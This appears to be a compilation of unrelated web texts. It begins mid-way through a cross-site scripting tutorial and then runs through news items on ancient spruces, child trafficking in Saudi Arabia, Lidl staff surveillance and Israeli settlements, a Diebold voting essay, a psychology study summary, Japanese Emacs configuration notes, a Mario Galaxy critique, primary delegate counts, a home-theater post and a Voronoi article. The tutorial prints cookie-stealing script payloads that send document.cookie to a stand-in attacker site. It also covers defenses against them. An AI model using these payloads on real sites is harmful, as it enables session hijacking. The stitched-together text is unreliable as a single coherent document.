Yet this is enough for the script to collect the cookies and send them to the attacker .
As a result , the attacker gets the cookies and impersonates the victim .
Explanation of the XSS technique
Let 's call the site under attack : www.vulnerable.site.
At the core of a traditional XSS attack lies a vulnerable script in the vulnerable site .
This script reads part of the HTTP request ( usually the parameters , but sometimes also HTTP headers or path ) and echoes it back to the response page , in full or in part , without first sanitizing it ( thus not making sure that it does n't contain JavaScript code nor HTML tags .
Suppose , therefore , that this script is named welcome.cgi , and its parameter is name .
It can be operated this way :
GET / welcome.cgi?name=Joe%20
Hacker HTTP/1.0 Host : www.vulnerable.site
The response would be :
< HTML > < Title > Welcome !</ Title > Hi Joe Hacker < BR >
Welcome to our system ...
</ HTML >
How can this be abused ?
Well , the attacker manages to lure the victim client into clicking a link that the attacker supplies to the user .
This is a carefully and maliciously crafted link that causes the Web browser of the victim to access the site ( www.vulnerable.site) and invoke the vulnerable script .
The data to the script consists of JavaScript that accesses the cookies that the client browser has stored for www.vulnerable.site.
This is allowed because the client browser " experiences " the JavaScript coming from www.vulnerable.site, and JavaScript security model allows scripts arriving from a particular site to access cookies that belong to that site .
Such a link looks like this one :
http://www.vulnerable.site/welcome.cgi?name=<script>alert(document.cookie)</script>
The victim , upon clicking the link , will generate a request to www.vulnerable.site, as follows :
GET / welcome.cgi?name=<script>alert(document.cookie ) </ script > HTTP/1.0 Host : www.vulnerable.site ...
The vulnerable site response would be :
< HTML > < Title > Welcome !</ Title > Hi < script>alert(document.cookie ) </ script > < BR > Welcome to our system ...
</ HTML >
The victim client 's browser would interpret this response as an HTML page containing a piece of JavaScript code .
This code , when executed , is allowed to access all cookies belonging to www.vulnerable.site.
Therefore , it will pop up a window at the client browser showing all client cookies belonging to www.vulnerable.site.
Of course , a real attack would consist of sending these cookies to the attacker .
For this , the attacker may erect a Web site ( www.attacker.site) and use a script to receive the cookies .
Instead of popping up a window , the attacker would write code that accesses a URL at www.attacker.site, thereby invoking the cookie - reception script , with a parameter being the stolen cookies .
This way , the attacker can get the cookies from the www.attacker.site server .
The malicious link would be :
http://www.vulnerable.site/welcome.cgi?name=<script>window.open
( " http://www.attacker.site/collect .cgi?cookie= " %2Bdocument.cookie )</ script >
And the response page would look like :
< HTML > < Title > Welcome !</ Title > Hi < script>window.open ( " http://www.attacker.site/collect.cgi?cookie= " +document.cookie ) </ script > < BR >
Welcome to our system ...
</ HTML >
The browser , immediately upon loading this page , would execute the embedded JavaScript and send a request to the collect.cgi script in www.attacker.site, with the value of the cookies of www.vulnerable.site that the browser already has .
This compromises the cookies of www.vulnerable.site that the client has .
It allows the attacker to impersonate the victim .
The privacy of the client is completely breached .
Note :
Causing the JavaScript pop-up window to emerge usually suffices to demonstrate that a site is vulnerable to an XSS attack .
If the JavaScript Alert function can be called , there is usually no reason for the window.open call not to succeed .
That is why most examples for XSS attacks use the Alert function , which makes it very easy to detect its success .
Scope and feasibility
The attack can take place only at the victim 's browser , the same one used to access the site ( www.vulnerable.site).
The attacker needs to force the client to access the malicious link .
This can happen in these ways :
The attacker sends an e-mail message containing an HTML page that forces the browser to access the link .
This requires the victim to use the HTML - enabled e-mail client , and the HTML viewer at the client is the same browser that is used for accessing www.vulnerable.site.
The client visits a site , perhaps operated by the attacker , where a link to an image or otherwise - active HTML forces the browser to access the link .
Again , it is mandatory that the same browser be used for accessing both this site and www.vulnerable.site.
The malicious JavaScript can access any of this information :
Permanent cookies ( of www.vulnerable.site) maintained by the browser
RAM cookies ( of www.vulnerable.site) maintained by this instance of the browser , only when it is currently browsing www.vulnerable.site
Names of other windows opened for www.vulnerable.site
Any information that is accessible through the current DOM ( from values , HTML code , and so forth )
Identification , authentication , and authorization tokens are usually maintained as cookies .
If these cookies are permanent , the victim is vulnerable to the attack even when not using the browser at the moment to access www.vulnerable.site.
If , however , the cookies are temporary , such as RAM cookies , then the client must be in session with www.vulnerable.site.
Anther possible implementation for an identification token is a URL parameter .
In such cases , it is possible to access other windows by using JavaScript in this way ( assuming that the name of the page with the necessary URL parameters is foobar ) :
< script> var victim_window=open ( " , ' foobar ' ) ; alert ( ' Can access : ' +victim_window.location.search )</ script >
Variations on this theme
It is possible to use many HTML tags , beside < SCRIPT > to run the JavaScript .
In fact , it is also possible for the malicious JavaScript code to reside on another server and to force the client to download the script and execute it , which can be useful if a lot of code is to be run or when the code contains special characters .
A couple of variations on these possibilities :
Rather than < script >...</ script > , hackers can use < img src= " javascript :... " > .
This is good for sites that filter the < script > HTML tag .
Rather than < script >...</ script > , it is possible to use < script src= " //... " > .
This is good for a situation where the JavaScript code is too long or when it contains forbidden characters .
Sometimes , the data embedded in the response page is found in non-free HTML context .
In this case , it is first necessary to " escape " to the free context , and then to append the XSS attack .
For example , if the data is injected as a default value of an HTML form field :
... < input type=text name=user value= " ... " > ...
Then it is necessary to include " > in the beginning of the data to ensure escaping to the free HTML context .
The data would be :
" >< script>window.open ( " http://www.attacker.site/collect.cgi?cookie= " +document.cookie ) </ script >
And the resulting HTML would be :
... < input type=text name=user value= " " >< script>window.open ( " http://www.attacker.site/collect.cgi?cookie= "+document.cookie)</script> " > ...
Other ways to perform traditional XSS attacks
So far , we have seen that an XSS attack can take place in a parameter of a GET request that is echoed back to the response by a script .
But it is also possible to carry out the attack with a POST request or by using the path component of the HTTP request -- and even by using some HTTP headers ( such as the Referer ) .
In particular , the path component is useful when an error page returns the erroneous path .
In this case , including the malicious script in the path will often execute it .
Many
Web servers are found vulnerable to this attack .
What went wrong ?
It is important to understand that , although the Web site is not directly affected by this attack ( it continues to function normally , malicious code is not executed on the site , no DoS condition occurs , and data is not directly manipulated nor read from the site ) , it is still a flaw in the privacy that the site offers its visitors , or clients .
This is just like a site deploying an application with weak security tokens , whereby an attacker can guess the security token of a client and impersonate him or her .
The weak spot in the application is the script that echoes back its parameter , regardless of its value .
A good script makes sure that the parameter is of a proper format , contains reasonable characters , and so on .
There is usually no good reason for a valid parameter to include HTML tags or JavaScript code , and these should be removed from the parameter before it is embedded in the response or before processing it in the application , to be on the safe side .
How to secure a site against XSS attacks
It is possible to secure a site against an XSS attack in three ways :
By performing in - house input filtering ( sometimes called input sanitation ) .
For each user input -- be it a parameter or an HTTP header -- in each script written in - house , advanced filtering against HTML tags , including JavaScript code , should be applied .
For example , the welcome.cgi script from the previous case study should filter the < script > tag after it is through decoding the name parameter .
This method has some severe downsides , though :
It requires the application programmer to be well - versed in security .
It requires the programmer to cover all possible input sources ( query parameters , body parameters of POST requests , HTTP headers ) .
requests , HTTP headers ) .
It cannot defend against vulnerabilities in third - party scripts or servers .
For example , it wo n't defend against problems in error pages in Web servers ( which display the path of the resource ) .
By performing " output filtering , " that is , filtering the user data when it is sent back to the browser , rather than when it is received by a script .
A good example for this would be a script that inserts the input data to a database and then presents it .
In this case , it is important not to apply the filter to the original input string , but only to the output version .
The drawbacks are similar to the ones for input filtering .
By installing a third - party application firewall , which intercepts XSS attacks before they reach the Web server and the vulnerable scripts , and blocks them .
Application firewalls can cover all input methods in a generic way ( including path and HTTP headers ) , regardless of the script or path from the in - house application , a third - party script , or a script describing no resource at all ( for example , one designed to provoke a 404 page response from the server ) .
For each input source , the application firewall inspects the data against various HTML tag patterns and JavaScript patterns .
If any match , the request is rejected , and the malicious input does not arrive at the server .
Ways to check whether your site is protected from XSS
Checking that a site is secure from XSS attacks is the logical conclusion of securing the site .
Just like securing a site against XSS , checking that the site is indeed secure can be done manually ( the hard way ) or by using an automated Web application vulnerability - assessment tool , which offloads the burden of checking .
The tool crawls the site and then launches all the variants that it knows against all of the scripts that it found by trying the parameters , the headers , and the paths .
In both methods , each input to the application ( parameters of all scripts , HTTP headers , path ) is checked with as many variations as possible , and if the response page contains the JavaScript code in a context where the browser can execute it , then an XSS vulnerability is exposed .
For example , sending this text :
< script>alert(document.cookie )</ script >
to each parameter of each script ( through a JavaScript - enabled browser to reveal an XSS vulnerability of the simplest kind ) the browser will pop up the JavaScript Alert window if the text is interpreted as JavaScript code .
Of course , there are several variants ; therefore , testing only that variant is insufficient .
And , as you already learned , it is possible to inject JavaScript into various fields of the request : the parameters , the HTTP headers , and the path .
However , in some cases ( notably the HTTP Referer header ) , it is awkward to carry out the attack by using a browser .
Summary
Cross - site scripting is one of the most common application - level attacks that hackers use to sneak into Web applications , as well as one of the most dangerous .
It is an attack on the privacy of clients of a particular Web site , which can lead to a total breach of security when customer details are stolen or manipulated .
Unfortunately , as this article explains , this is often done without the knowledge of either the client or the organization being attacked .
To prevent Web sites being vulnerable to these malicious acts , it is critical that an organization implement both an online and offline security strategy .
This includes using an automated vulnerability - assessment tool that can test for all of the common Web vulnerabilities and application - specific vulnerabilities ( such as cross - site scripting ) on a site .
For a full online defense , it is also vital to install a firewall application that can detect and defend against any type of manipulation to the code and content sitting on and behind the Web servers .

STOCKHOLM ( Reuters ) - Scientists have found a cluster of spruces in the mountains in western Sweden which , at an age of 8,000 years , may be the world ’s oldest living trees .
The hardy Norway spruces were found perched high on a mountain side where they have remained safe from recent dangers such as logging , but exposed to the harsh weather conditions of the mountain range that separates Norway and Sweden .
Carbon dating of the trees carried out at a laboratory in Miami , Florida , showed the oldest of them first set root about 8,000 years ago , making it the world ’s oldest known living tree , Umea University Professor Leif Kullman said .
California ’s “ Methuselah ” tree , a Great Basin bristlecone pine , is often cited as the world ’s oldest living tree with a recorded age of between 4,500 and 5,000 years .
Two other spruces , also found in the course of climate change studies in the Swedish county of Dalarna , were shown to be 4,800 and 5,500 years old .
“ These were the first woods that grew after the Ice Age , ” said Lars Hedlund , responsible for environmental surveys in the county of Dalarna and collaborator in climate studies there .
“ That means that when you speak of climate change today , you can in these ( trees ) see pretty much every single climate change that has occurred . ”
Although a single tree trunk can become at most about 600 years old , the spruces had survived by pushing out another trunk as soon as the old one died , Professor Kullman said .
Rising temperatures in the area in recent years had allowed the spruces to grow rapidly , making them easier to find in the rugged terrain , he added .
“ For quite some time they have endured as bushes maybe 1/ 2 meter tall , ” he said .
“ But over the past few decades we have seen a much warmer climate , which has meant that they have popped up like mushrooms in the soil . ”
Ali was beaten up for initially refusing to beg
Programme preview
Many hail from countries like Yemen which , despite bordering one of the Middle East 's richest states , is a world away in terms of economic prosperity .
These children are often sold by families who are either duped into believing their offspring will get a better life or sometimes simply threatened .
Once in the country , they are likely to face beatings and are sometimes even mutilated as their Dickensian masters stoop to any low to try to improve the chances of them earning more money .
The Ministry of Social Affairs in Saudi Arabia 's western province has a unit dedicated to picking up children who are illegal in the country .
It is tasked with taking these children from the streets and then investigating their stories .
Efforts are made to try to find their families but often no relatives are found .
In such cases , these youngsters are deported as illegal aliens back to their country of origin .
What is clear is that they are working for others , out of education , kept in a cycle of poverty and danger
But to bring these children in , the unit must carry out night - time swoops to find children begging without families .
When these children are found , they are often frightened and desperate to get away from the Saudi officials .
One child found by the team during a raid , Ali , is a typical victim of the slavery business .
Initially , he attempted to convince officials that he was in the city with his brother .
However , it soon became clear that this was not the case .
' Smuggled '
Eventually ,
Ali revealed that he slept under a bridge or in " any house " he could find .
He avoided using shoes , to boost his chances of getting money .
While the details of Ali's story are sketchy , we know that Ali was smuggled across the porous border between the Yemen and Saudi Arabia .
In 2005 , the Yemeni Ministry of Social Affairs acknowledged that about 300 children were crossing the border every month .
It is not always possible to know the entire truth about these children but what is clear , is that they are working for others , out of education , and kept in a cycle of poverty and danger .
Ali told officials at the shelter : " I was smuggled in , in order to beg .
I told him ( the gangmaster ) I do n't want to beg , so he beat me up . "
The boy said he ended up begging because of physical abuse involving metal wire attacks to his back .
He also said he was forced to beg all day , but claimed that he only gave some of his earnings back to his paymaster .
Fake story
Such is the scale of the problem that a centre to house rescued children has been opened in Yemen at the Harad Border Crossing .
Ali now faces an uncertain future
That is Ali 's most likely destination .
The precise truth of his story will probably never be known .
Even officials in the shelter do not really believe the account he has given them , citing inconsistencies with earlier interviews .
Those brought to the shelter have often been schooled to give some sort of false story about having families in Saudi Arabia .
The children caught are almost entirely boys and although many come from Yemen , others come from countries such as Somalia , Sudan , Chad , Pakistan and India .
Yemen has become more involved in child trafficking since its workers were expelled from Saudi Arabia in the 1990s following the first Gulf War .
Children were sent instead because Saudi authorities do not prosecute children .
Meanwhile , the future for Ali is uncertain .
A delegate from the Yemeni Embassy will visit the shelter to pursue Ali 's case and try to trace his family .
In all likelihood , he will be deported back to his country of origin , but with the trade of children continuing to rise , Saudi officials will probably be meeting many more like him .

81 % of New Hampshire ballots are counted in secret by a private corporation named Diebold Election Systems ( now known as " Premier " ) .
The elections run on these machines are programmed by one company , LHS Associates , based in Methuen , MA .
We know nothing about the people programming these machines , and we know even less about LHS Associates .
We know even less about the secret vote counting software used to tabulate 81 % of our ballots .
People like to say " but we use paper ballots !
They can always be counted by hand ! "
But they 're not .
They 're counted by Diebold .
Only a candidate can request a hand recount , and most never do so .
And a rigged election can easily become a rigged recount , as we learned in Ohio 2004 , where two election officials were convicted of rigging their recount .
( Is it just a funny coincidence that Diebold spokesman is named Mr. Riggall ? )
We need to get the count right on election night .
Right now , nobody in New Hampshire , except the programmers at LHS Associates and Diebold Election Systems , knows if we are getting it right or wrong .
Our state officials and representatives know this .
They learned all about it when computer security specialists Harri Hursti and Bruce Odell testified before the legislative subcommittee on e-voting in September 2007 ( Hursti 's testimony is shown in this video ) .
Scientific reports about the vulnerabilities and risks with Diebold optical scanners have been available since 2003 .
We love our state .
It takes courage and strength to admit where we are going wrong and to fix it .
May our state officials and representatives find that courage and strength soon .
Before we lose the other 19 % of our votes .

Optimists and Realists Seen In Better Light Than Pessimists
… although we ’re just as likely to provide support to optimists , pessimists and realists alike .
Being an optimist is supposed to be good for health , success and happiness .
But does optimism have a downside in that other people think you ’re self - deluded , mindless and just plain annoying ?
And on the flipside , how do people view pessimists ?
In particular , do we tend to shy away from helping out pessimists when they are in trouble ?
Perceptions of optimists , pessimists and realists
In a recent study published in The Journal of Positive Psychology carried out by Vollmann , Renner and Weber ( 2007 ) participants listened to one of three conversation between two flatmates .
In one the target person talked in an optimistic way about a moderately stressful relationship - related situation , in the second in a realistic way and in the third their response was pessimistic .
Afterwards participants were asked to provide a rating of how they evaluated the target ’s personality , how much they were attracted to the target and whether they would provide them with social support .
Here are the results :
1 . Good news for optimists
Contrary to some people ’s view , optimists are generally seen in a positive light – so not much sign of optimists as ‘ mindless ’ and ‘ self - deluded ’ .
But , if you ’re an optimist , this is exactly what you expected , right ?
2 . Bad news for pessimists
Sorry pessimists , it seems as if you are viewed in a more negative way than optimists and realists .
Other people are probably slightly put off by your view of the world .
In particular they rate the ‘ effectiveness ’ of pessimistic behaviour very poorly .
But if you ’re a pessimist you probably suspected that , right ?
3 . Good news for pessimists
Despite their slightly more negative view , though , it seems people are just as likely to help out a pessimist who is in need .
4. Great news for realists
Realists , however , have the best of all worlds .
They consistently get ratings equivalent to optimists , but their attitudes and behaviours are seen as more ‘ adequate ’ than both optimists and pessimists .
Widening the generalisability
A criticism of this study was that it only looked at perceptions of how a person reacted to a relationship - related stressful situation .
So these results cannot be applied to different situations .
However , in a further study , Vollmann , Renner and Weber ( 2007 ) widened the generalisability of the findings by looking at an achievement - related situation .
Here the experimental procedure was exactly the same except this time the target person that participants were listening to was talking about applying for a dream job .
As before three different groups listened to an optimistic , pessimistic and realistic reaction to the situation .
Here are the results :
1 . More bad news for pessimists
I ’m sorry to say that pessimists came off even worse in this second ‘ achievement - related ’ study .
The pessimistic target ’s behaviour was consistently perceived as significantly less adequate , less effective and even less interpersonally attractive than both optimists and realists .
2. Small silver lining
Despite these negative ratings , people are still just as likely to provide social support to a pessimist as they are to both optimists and realists .
3. Optimists and realists in the same boat ( almost )
Again the ratings for the behaviour of the optimistic and realistic target were very similar with only the adequacy of the realistic target being seen as slightly higher than the optimist .
Do pessimists receive less social support ?
This research was partly motivated by the finding that pessimists report receiving less social support than optimists .
And as high social support is related to positive health outcomes , this is a worrying trend .
This study suggests , though , that people are just as likely to offer social support to both optimists and pessimists .
So , what ’s going on ?
An intriguing possibility is suggested by Vollmann , Renner and Weber ( 2007 ) .
This is that optimists do not actually receive any greater levels of social support than pessimists – they just think they do .
This in turn leads to more positive health - related outcomes .
So , optimists might really be ‘ thinking themselves better ’!
Bear in mind , though , that this last point is speculation and there is no evidence from the current study about the causal direction .
Still , though , sounds pretty convincing does n’t it ?

According to German newsmagazine Stern , Lidl officials last year ordered detectives to install hidden cameras in several stores in Germany to observe their employees at work and during breaks .
The magazine received several hundred pages of reports on Lidl employees that included information on when they left work to use the restroom , personal phone conversations employees made and comments on their appearance .
Lidl officials acknowledged that the company had used cameras and detectives but not to watch its workers .
" The idea that we would ' spy ' on our employees does not at all comply with our leadership principles and the fair treatment of our workers , " said company director Juergen Kissebert in a statement .
He added that Lidl was putting an immediate stop to the practice .
Stasi techniques ?
An employee 's tatoo did not make detectives happy
The style of the reports recalled the detailed surveillance records of East Germany 's secret police , the Stasi .
In one case , a detective commented on the " self - made " tattoos visible on an employee 's forearms and suggested that she should be asked to cover them up as especially elderly customers might think she got them in prison .
In another case , the report quoted a conversation between two employees , with one telling the other she hoped her wages had been transferred to her account since she desperately needed money that night .
" For what ? " asked the detective in his report .
Work vs. privacy
Many other surveillance notes , which can be read on Stern 's Web site , focus on the employees ' work habits , mentioning things such as a candy bar left lying atop female hygiene products rather than being returned to its correct place and employees talking to each other in Polish in front of customers .
Lidl officials , who did not deny the existence of the reports , have said that they were simply intended to uncover " possible misconduct " by employees .
They distanced themselves from the idea of spying on people 's privacy , saying that the reports were not in line with the company 's " way of dealing with each other . "
Calls for investigation
Schaar said that the latest allegations should be investigated
Germany 's data protection officer , Peter Schaar , meanwhile told Stern that the reports were a grave infringement on the country 's data protection laws .
He said he expected data protection agencies to investigate the matter .
State officials in the southwestern state of Baden - Wuerttemberg , where Lidl is headquartered , said that they would check into the matter , according to German news service DPA .
A European giant
Lidl has stores in 23 European countries , according to the company 's Web site .
The chain came under pressure from German services sector trade union Verdi in 2004 , when the union published a black book on the company 's practices in dealing with employees .
Apart from Germany 's No.1 discounter Aldi , Lidl remains the country 's most popular store for cheap food and other low - price products , according to a study published this month .
実を言うと僕は略語展開をあまり使わない人です。というのは略語展開結果が予測しづらいし、それで迷うぐらいならそのまま打ってしまったほうが早いことが多々あるからです。
しかし良質な略語展開機能を使えば入力速度もあがると思うので略語展開に関して調べてみました。とりあえず pabbrev.el を使ってみようかと思います。
hippie - expand hippie - expand はいろいろな略語展開機能を統一してくれるすごいやつです。具体的には以下のように略語展開機能を列挙しておいて、 hippie - expand を実行すると hippie - expand が上から順に略語展開を起動していき、最初に展開に成功したものを略語展開結果にします。 hippie - expand は略語展開を使うか使わないかに関わらず設定しておくべきです。 ( setq hippie - expand - try - functions - list '( try - complete - file - name - partially try - complete - file - name try - expand - all - abbrevs try - expand - list try - expand - line try - expand - dabbrev try - expand - dabbrev - all - buffers try - expand - dabbrev - from - kill try - complete - lisp - symbol - partially try - complete - lisp - symbol ) ) hippie - expand を使えば静的略語展開だとか動的略語展開だとか迷わずに済みます。 たぶん使い方は間違ってますが hippie - expand は tempo や tempo- snippets とも共存できます。 ( defun try - expand - tempo ( old ) ( tempo - expand - if - complete ) ) ( defun try - expand - tempo - snippets ( old ) ( tempo - snippets - complete - tag ) ) ( setq hippie - expand - try - functions - list '( try - expand - tempo try - expand - tempo- snippets ) ) ほとんどネタですが、実は略語展開以外のこともできます。
( defun try - increment - number ( old ) ( he - init - string ( he - lisp - symbol - beg ) ( point ) ) ( if ( string - match " ^[ 0 - 9 ] + $ " he - search - string ) ( he - substitute - string ( number - to - string ( 1+ ( string - to - number he - search - string ) ) ) ) ) ) ( setq hippie - expand - try - functions - list '( try- increment - number ) ) 数値の後ろにカーソルをもっていておもむろに hippie - expand すると数値がインクリメントされます。 このように hippie - expand ができるのは略語展開だけではないのでアイデア次第でかなりいろいろな事ができると思います。 ちなみに僕は以下のような設定にしています。 ( global - set - key " \M - / " ' hippie - expand ) ( defun try - expand - abbrev ( old ) ( if ( expand - abbrev ) t nil ) ) ( defun try - expand - tempo ( old ) ( tempo - expand - if - complete ) ) ( defun try - expand - tempo - snippets ( old ) ( tempo - snippets - complete - tag ) ) ( setq hippie - expand - try - functions - list '( ; try - complete - file - name - partially ; try - complete - file - name try - expand - tempo try - expand - tempo - snippets try - expand - abbrev try - expand - all - abbrevs ; try - expand - list try - expand - line try - expand - dabbrev try - expand - dabbrev - all - buffers try - expand - dabbrev - from - kill try - complete - lisp - symbol - partially try - complete - lisp - symbol ) )
tempo-snippet.el いまいちな snippet.el のかわりに作られたのが tempo-snippet.el ( * ) です。 tempo.el と snippet.el の良いところを集めた感じの出来になっています。 (*)

[ In this in - depth critique , game designer David Sirlin ( Super Street Fighter II Turbo HD Remix ) analyzes Nintendo's Super Mario Galaxy , discussing what it did right - and what it could do better - in creating its ' polished , beautiful ' game world .
Please note that this article contains some gameplay - related spoilers for the game . ]
I 've only said " Wow ! " a few times in the last couple decades of playing games .
One of those times was for the breakthrough Super Mario 64 , a game that took action / platforming into a 3D world and made it work .
It 's fitting that I said it again over its ( true ) sequel , Super Mario Galaxy , a game that took action / platforming even more into 3D and made that work , too .
In point of fact , I might have more reason than most to say " Wow " over this game .
Years ago , I worked at a small company that went out of business where I was designing a 3D platform game that played with gravity .
Now , so much later , it 's great to see Mario Galaxy realizing these same ideas in the most clever , polished , beautiful ways possible .
Why is Mario Galaxy so good and what can we learn from it ?
To borrow some terms from Nicole Lazzaro 's four kinds of fun , Mario Galaxy has hard fun , easy fun , and social fun as well as the ability to evoke the emotions of surprise and wonder .
Hard Fun
Gamers know this kind of fun all too well .
This is the fun of overcoming obstacles and attaining goals .
When you succeed at an especially difficult challenge , the Italian word fiero describes the emotion you feel as you raise your fist into the air triumphantly .
Mario Galaxy has 120 stars to collect , offering plenty of this type of fun .
Hard fun is so common in games that the only thing worth noting here is how well Mario Galaxy informs the player about exactly which goal he 's going for , which goals are completed , and how many goals are left .
I think this clarity magnifies the fiero aspect of the game .
Putting the tally of hard fun at center stage ( the number of Mario Stars , out of 120 , you 've collected ) makes it all the more satisfying to achieve the goals .
Easy Fun
Ironically , this fun is much more rare in games .
This is fun that 's not bound up with winning or goals .
The entire Nintendo Wii system has an advantage here because the motion - sensing Wiimote lends itself to easy fun .
Collecting the star bits ( the colorful , glowing ammunition that bounces around everywhere ) with the Wiimote 's pointer is easy fun .
Shooting the star bits at enemies is easy fun , though hardly ever required to achieve goals .
Using the left - right - left - right gesture to do the spin attack is easy fun .
Another part of easy fun is exploration and variety .
Some of the gameplay variety in Mario Galaxy includes :
Flying with the bee suit
Shooting fireballs with the fire suit
Creating frozen platforms and ice skating with the ice suit
Becoming a ghost who can turn invisible and float with the ghost suit
Jumping very high with the spring suit
Riding a manta ray on the water in a race
Riding a turtle shell underwater in many situations , including races
Balancing on a ball as you navigate through a level
Flying with the red star suit
Numerous tricks of gravity that vary across several levels
Just the moment - to - moment interactions involved with these things are fun , without even considering how they are used in the context of hard - fun - goals .
Let 's count the ways that Obama is winning :
1. ) Pledged Delegates : ( Using AP 's numbers , with Obama 's count in parenthesis )
Obama : 1,390 ( 1,411 )
Clinton : 1,248 ( 1,250 )
2. ) Popular vote : I updated this post with results from Mississippi .
I took out the Texas caucuses just to give this the best pro-Clinton spin possible , though I still think the caucuses are a separate contest and need to be accounted for .
( Obama ended up winning Mississippi by over 100,000 votes . )
Obama : 13,614,204
Clinton : 12,801,153
3. ) Primaries Won :
There are 37 total primary contests .
All Obama has to do is win three more and he notches the lead in these contests .
He can do that easily with just three out of Montana , South Dakota , Oregon , Indiana , and North Carolina .
Obama : 16
Clinton : 12
4. ) Caucuses Won
Obama : 14
Clinton : 3
5. ) Overall contests
Won : It 's a 2 - 1 Obama advantage ( includes territories and Democrats Abroad ) .
Obama : 30
Clinton : 15
6. ) Red and Blue States Won ( including DC , not including territories or Democrats Abroad ) :
Obama : 16 Red , 11 Blue
Clinton : 8 Red , 6 Blue
8. ) Money Raised ( through February )
Obama : $ 168 million
Clinton : $ 140 million
So that leaves the Clinton campaign with what , exactly ?
Big states !
Big states !
Big states !
I addressed that one yesterday .
Team Clinton has nothing except schemes of coup by super delegate , which they apparently think they can do by insulting entire Democratic constituencies and most of our nation 's states .
But really , what else do they have ?
Their campaign is losing by every metric possible .
JERUSALEM ( AP )  Israel announced plans Sunday to build hundreds of homes in the West Bank and disputed east Jerusalem , setting off another crisis in the embattled peace process ahead of the arrival of a key U.S. mediator .
The fatal shooting of eight rabbinical seminary students by a Palestinian resident of Jerusalem dampened low expectations for negotiations that aim for a treaty this year .
Palestinian negotiator Saeb Erekat said the new plans further undermine talks between Israel and the West Bank administration of Palestinian President Mahmoud Abbas .
" Why do they insist on doing this and humiliating Abu Mazen in front of the Palestinian public , " he said , using Abbas ' nickname .
Israeli Housing Minister Zeev Boim said the construction would include 350 apartments in Givat Zeev , a West Bank settlement just outside of Jerusalem , and 750 homes in Pisgat Zeev , a Jewish neighborhood in east Jerusalem .
Israel captured and annexed east Jerusalem in the 1967 Mideast war but Palestinians claim it as their capital and the annexation is not recognized internationally .
Givat Zeev is in one of the three major settlement blocs that Israel intends to retain in any peace agreement .
Bush has signaled support for the Israeli position , and the Palestinians have expressed willingness to consider swapping land where settlement blocs stand for equal amounts of Israeli land .
Boim told Israel Radio that the Givat Zeev construction began eight years ago but was suspended because of fighting with the Palestinians .
" When violence subsided , demand grew again and contractors renewed their permits to build there , " he said .
Erekat said he has appealed to the U.S. to pressure Israel to halt the projects .
Palestinians charge that Israeli settlement expansion is sabotaging their efforts to build a state in the West Bank and Gaza Strip .
Israeli Prime Minister Ehud Olmert and Abbas promised President Bush last November to work for a peace treaty this year , renewing negotiations that were frozen during seven years of violence .
But the talks have already been interrupted several times because of arguments over Israeli construction in disputed areas .
Abbas then suspended the talks because of Israel 's Gaza offensive last week to try to stop daily Palestinian rocket barrages on southern Israel .
He agreed to renew them only under direct pressure from Secretary of State Condoleezza Rice .
Then came the seminary attack , hours after Palestinians in Gaza set off a bomb on the border , killing two soldiers , a Bedouin and a Jew .
The Jewish soldier died of his wounds Sunday and was buried in a funeral ceremony conducted partly in sign language , because both his parents are deaf .
U.S. envoy Lt. Gen. William Fraser III is scheduled to arrive in the region on Thursday for his first joint meeting with Israelis and Palestinians .
Bush appointed Fraser in January to monitor implementation of the U.S. - backed " road map " peace plan — which , among other things , calls on Israel to freeze all settlement activity .
The plan also calls on the Palestinians to dismantle violent groups — a step Israel says has not been fulfilled .
The latest construction dispute involves three of the four main core issues that have defied solution in more than a decade of on - again , off - again peace negotiations — borders between Israel and a Palestinian state , Jewish settlements in the West Bank and the future of Jerusalem .
The fourth issue is a solution for Palestinian refugees .
Most of the 270,000 West Bank settlers live in the major blocs , and an additional 180,000 Israelis live in Jewish neighborhoods Israel built in east Jerusalem after 1967 .
Israel does not consider the east Jerusalem neighborhoods to be settlements , but the Palestinians and international community do .

Last year around superbowl time , I posted an article showing how my roommate and I had built a stadium seating setup for our living room .
This year , we went one step further and added a 2500 lumen projector to the mix to create the ultimate home theater system on a budget .
You 'll need a projector and screen .
Finding a worthy projector is the hardest part of setting up your own home theater .
Since new projectors , especially ones powerful enough to be used in a home theater setting , are prohibitively expensive I began browsing for used projectors .
When searching for used projectors you need to ask about the condition of the bulb .
Most projector bulbs last around 2,000 hours and replacements cost several hundred dollars so it 's imperative that you get one with a few hundred hours left , at least .
If the owner does n't know , tell them to go through the projector 's menu - there is often a way to display the number of hours used on the bulb .
You also need to check that the projector does n't draw too much power .
Chris and I were almost set on purchasing a massive CRT projector until we realized it needed a 220 VAC line and a whopping 30 amps .
After a while of browsing Craigslist and emailing several people , I found a suitable projector : a Sanyo Pro Xtra X PLC - XP21N .
The bulb was in good condition ( about 300 hours used out of 2,000 ) as was the rest of the unit .
When the projector launched in 2001 , it carried an MSRP of 12 k so it was definitely a steal .
It features a native resolution of 1024x768 and support for 1280x1024 compressed , with 3 LCDs for RGB .
It 's not DLP but features a decent 700:1 contrast ratio and for 350 divided 3 ways ( split between roommates ) , I can't complain .
As for inputs , it has component , s- video , composite , and a few DE - 15 VGA monitor inputs .
Most content will be delivered through component cables from the Vudu box , VGA directly from a dedicated home theater PC or composite from our non-HD Comcast cable box .
Chris 's desktop serving as a makeshift HTPC under the stadium seating platform .
The same person from Craigslist was also selling a 100 - inch Da-Lite Da-Snap projector screen for 100 so we purchased that as well .
That was also a steal considering the screen sells for over 1,000 new .
Overall , I think it is a sound investment and will put our couches to good use .
The only issue is the person sitting in front of the projector needs to lay low while the person above the projector must not dangle their legs in front of it .
A small sacrifice for an awesome theater setup if you ask me .
The next step includes Chris building a dedicated HTPC and me finishing up my 750 GB + 74 GB file server .
Sorry for the picture quality , I took this from my iPhone whilst sitting on a couch to the side .
Verdict : Badass on a budget .

Voronoi Diagrams and a Day at the Beach
Posted August 2006 .
Voronoi diagrams have been used by anthropologists to describe regions of influence of different cultures ; by crystallographers to explain the structure of certain crystals and metals ; by ecologists to study competition between plants ; and by economists to model markets in the U.S. economy ...

Introduction
Suppose that you live in a desert where the only sources of water are a few springs scattered here and there .
For each spring , you would like to determine the locations nearest that spring .
The result could be a map , like the one shown here , in which the terrain is divided into regions of locations nearest the various springs .
Maps like this appear frequently in various applications and under many names .
To mathematicians , they are known as Voronoi diagrams .
The locations of the springs are known , more generally , as sites and the set of points nearest a site is its Voronoi cell .
Here is a program that shows how the diagram changes as the sites move .
Voronoi diagrams are rather natural constructions , and it seems that they , or something like them , have been in use for a long time .
For instance , Descartes included the following figure with his demonstration of how matter is distributed throughout the solar system .
Since that time , Voronoi diagrams have been used by anthropologists to describe regions of influence of different cultures ; by crystallographers to explain the structure of certain crystals and metals ; by ecologists to study competition between plants ; and by economists to model markets in the U.S. economy .
